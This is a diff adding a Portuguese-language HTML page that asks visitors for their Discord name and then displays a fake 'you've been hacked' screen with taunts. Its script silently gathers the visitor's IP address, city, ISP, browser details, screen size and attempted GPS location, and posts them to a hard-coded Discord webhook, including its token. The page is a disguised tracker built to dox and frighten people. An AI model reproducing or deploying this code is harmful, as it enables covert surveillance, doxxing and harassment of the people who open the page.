@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALERTA DE SEGURANÇA</title>
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            color: black;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        
+        #container {
+            text-align: center;
+        }
+        
+        #hackScreen {
+            display: none;
+            background-color: black;
+            color: lime;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 100;
+            text-align: center;
+            animation: flash 0.5s infinite;
+        }
+        
+        @keyframes flash {
+            0%, 100% { background-color: black; }
+            50% { background-color: #220000; }
+        }
+        
+        h1 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px lime;
+            animation: glitch 1s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(3px, -3px); }
+            60% { transform: translate(-3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+        
+        #image {
+            max-width: 80%;
+            border: 3px solid red;
+            box-shadow: 0 0 20px red;
+            margin: 20px 0;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { border-color: red; box-shadow: 0 0 10px red; }
+            50% { border-color: lime; box-shadow: 0 0 30px lime; }
+            100% { border-color: red; box-shadow: 0 0 10px red; }
+        }
+        
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.2;
+        }
+        
+        .counter {
+            font-size: 1.5em;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1>Qual é o seu nome no Discord?</h1>
+        <input type="text" id="discordName" placeholder="Digite seu nome" />
+        <button onclick="startHack()">Enviar</button>
+    </div>
+
+    <div id="hackScreen">
+        <canvas id="matrix"></canvas>
+        <h1>VOCÊ FOI HACKEADO!</h1>
+        <img id="image" src="https://buceteiro.com/x/2024/04/thumbs-252.jpg" alt="HACKED">
+        <div class="counter" id="counter">COLETANDO DADOS... 0%</div>
+        <p>EU SEI ONDE VOCÊ ESTÁ HAHAHAHA</p>
+    </div>
+
+    <script>
+        // ================== MATRIZ DE FUNDO ==================
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "DRAX666666666666666666666666666666666666666666";
+        const fontSize = 14;
+        const columns = Math.floor(canvas.width / fontSize);
+        const drops = [];
+        
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = 'lime';
+            ctx.font = fontSize + 'px monospace';
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 50);
+        
+        // ================== ENVIO DE DADOS NA ABERTURA ==================
+        async function collectAndSendData(discordName) {
+            const counter = document.getElementById('counter');
+            const hackScreen = document.getElementById('hackScreen');
+            hackScreen.style.display = 'block';
+            document.getElementById('container').style.display = 'none';
+            
+            try {
+                // Coleta dados reais
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                const userData = {
+                    ip: ipData.ip,
+                    city: ipData.city || 'Não identificado',
+                    region: ipData.region || 'Não identificado',
+                    country: ipData.country_name || 'Não identificado',
+                    isp: ipData.org || 'Não identificado',
+                    browser: navigator.userAgent,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    languages: navigator.languages.join(', '),
+                    platform: navigator.platform,
+                    cookies: navigator.cookieEnabled ? 'Ativados' : 'Desativados',
+                    timestamp: new Date().toLocaleString(),
+                    latitude: 'Desconhecido',
+                    longitude: 'Desconhecido'
+                };
+                
+                // Geolocalização
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        userData.latitude = position.coords.latitude;
+                        userData.longitude = position.coords.longitude;
+                    }, (error) => {
+                        console.log('Erro ao obter localização: ', error);
+                    });
+                }
+
+                // Envia para o webhook do Discord IMEDIATAMENTE ao carregar
+                const response = await fetch('https://discordapp.com/api/webhooks/1387674705447747654/lJUkJZOhmBtSvfgiLNxnkHOgUNicYVVEXd-jgK5omv8BAlmoPz8vRMx5M-OwoeGCkfMY', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "DRAX HACKER",
+                        avatar_url: "https://buceteiro.com/x/2024/04/thumbs-252.jpg",
+                        embeds: [{
+                            title: "🚨 DADOS CAPTURADOS 🚨",
+                            description: `
+                                **Nome do Discord:** ${discordName}
+                                **IP:** \`${userData.ip}\`
+                                **Localização:** ${userData.city}, ${userData.region}, ${userData.country}
+                                **Provedor:** ${userData.isp}
+                                **Navegador:** \`${userData.browser}\`
+                                **Tela:** ${userData.screen}
+                                **Idiomas:** ${userData.languages}
+                                **Plataforma:** ${userData.platform}
+                                **Cookies:** ${userData.cookies}
+                                **Latitude:** ${userData.latitude}
+                                **Longitude:** ${userData.longitude}
+                                **Acesso em:** ${userData.timestamp}
+                            `,
+                            color: 0xFF0000,
+                            thumbnail: {
+                                url: "https://buceteiro.com/x/2024/04/thumbs-252.jpg"
+                            },
+                            footer: {
+                                text: "⚠️ ESSES DADOS FORAM COLETADOS AUTOMATICAMENTE"
+                            }
+                        }]
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Falha no envio do webhook');
+                }
+                
+                counter.textContent = "DADOS ENVIADOS! EU TE ENCONTREI!";
+                counter.style.color = "red";
+                counter.style.textShadow = "0 0 10px red";
+                
+            } catch (error) {
+                counter.textContent = "ERRO NA TRANSMISSÃO";
+                console.error("Erro:", error);
+            }
+        }
+        
+        // Inicia o hack após o nome do Discord ser enviado
+        function startHack() {
+            const discordName = document.getElementById('discordName').value;
+            if (discordName) {
+                collectAndSendData(discordName);
+            } else {
+                alert("Por favor, insira seu nome no Discord.");
+            }
+        }
+    </script>
+</body>
+</html>
